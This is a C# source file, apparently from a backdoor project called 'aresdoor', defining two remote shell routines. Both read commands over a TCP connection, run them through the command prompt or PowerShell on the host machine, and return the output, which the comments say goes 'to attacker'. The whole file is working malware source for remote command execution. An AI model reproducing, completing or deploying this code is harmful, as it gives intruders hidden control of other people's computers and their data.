using System;

namespace aresdoor
{
    class BackdoorCollection
    {
        NetworkCommunication nc = new NetworkCommunication();

        public bool CommandPromptBackdoor(System.Net.Sockets.TcpClient tcpClient)
        {
            while (true)
            {
                // Send shellcode to attacker
                nc.DataTravelTO(tcpClient, System.IO.Directory.GetCurrentDirectory() + "> ");
                // Recieve response from client application
                string responseFromServer = nc.DataTravelFROM(tcpClient);

                if (responseFromServer.Contains("cd"))
                    System.IO.Directory.SetCurrentDirectory(responseFromServer.Split(" ".ToCharArray())[1]);
                else if (responseFromServer.Contains("exit"))
                    return false;
                else
                    try { nc.DataTravelTO(tcpClient, CommandShell.execCommandPrompt(responseFromServer)); } // Execute command and send output to attacker
                #if DEBUG
                    catch (Exception exc) { Console.WriteLine(exc); return false; }
                #else
                    catch (Exception) { nc.DataTravelTO(tcpClient, "Command didn't execute."); return false; }
                #endif
            }

            return false; // Should we ever get here, it's probably because of an error.
        }

        public bool PowershellBackdoor(System.Net.Sockets.TcpClient tcpClient)
        {
            while (true)
            {
                // Send shellcode to attacker:
                nc.DataTravelTO(tcpClient, "PS " + System.IO.Directory.GetCurrentDirectory() + "> ");
                // Recieve response from client application
                string responseFromServer = nc.DataTravelFROM(tcpClient);

                if (responseFromServer.Contains("cd"))
                    System.IO.Directory.SetCurrentDirectory(responseFromServer.Split(" ".ToCharArray())[1]);
                else if (responseFromServer.Contains("exit"))
                    return false;
                else
                    try { nc.DataTravelTO(tcpClient, CommandShell.execPowershellCommand(responseFromServer)); } // Execute command and send output to attacker
                #if DEBUG
                    catch (Exception exc) { Console.WriteLine(exc); return false; }
                #else
                    catch (Exception) { nc.DataTravelTO(tcpClient, "Command didn't execute."); return false; }
                #endif
            }

            return false; // Should we ever get here, it's probably because of an error.
        }
    }
}
